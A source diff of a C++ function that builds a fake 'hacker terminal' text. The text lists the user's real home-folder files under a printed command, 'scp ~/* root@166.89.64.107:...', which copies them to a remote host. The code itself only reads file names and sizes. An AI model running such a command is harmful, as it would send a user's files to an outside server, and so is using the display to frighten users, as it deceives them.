@@ -1,22 +1,14 @@
-#ifdef _MSC_VER
-#pragma warning(push)
-#pragma warning(disable: 4244)
-#endif
+#include <chrono>
 
-//#include <algorithm>
-//#include <boost/process.hpp>
-
-#ifdef _MSC_VER
-#pragma warning(pop)
-#endif
-
-#include <boost/algorithm/string/join.hpp>
+#include <boost/filesystem.hpp>
+#include <boost/date_time.hpp>
 
 #include <fmt/core.h>
 
 #include "HackerTerminal.h"
 #include "../TTUtils.h"
 
+namespace fs = boost::filesystem;
 
 namespace tt
 {
@@ -26,23 +18,31 @@ namespace
 
 std::string getHackerText()
 {
-    //namespace bp = boost::process;
-    //bp::ipstream pipe_stream;
+    std::stringstream output;
+    fs::path userfolder{ getUserFolder() };
 
-    //const auto command = fmt::format("ls {}", getUserFolder());
-    //bp::child ch(command, bp::std_out > pipe_stream);
+    boost::posix_time::ptime tl = boost::posix_time::second_clock::local_time();
+    output << "$> scp ~/* root@166.89.64.107:/subject_t/backups/"
+        << fmt::format("{:04}-{:02}-{:02}", tl.date().year(), tl.date().month(), tl.date().day())
+        << std::endl
+        << std::endl;
 
-    //std::string line;
-    //std::vector<std::string> lines;
+    for(auto& entry : boost::make_iterator_range(fs::directory_iterator(userfolder), {}))
+    {
+        if (fs::is_directory(entry)) continue;
 
-    //while (ch.running() && std::getline(pipe_stream, line) && !line.empty())
-    //{
-    //    lines.push_back(line);
-    //}
+        std::uint32_t size = fs::file_size(entry.path()) / 1024u;
 
-    //return boost::algorithm::join(lines, "\n");
+        output <<
+            fmt::format("{:<30} [*********] {:>6}KB   00:00", entry.path().filename().string(), size) << '\n';
+    }
 
-    return {};
+    output << std::endl
+        << "$> logout"
+        << std::endl
+        << "Closing connection";
+
+    return output.str();
 }
 
 }
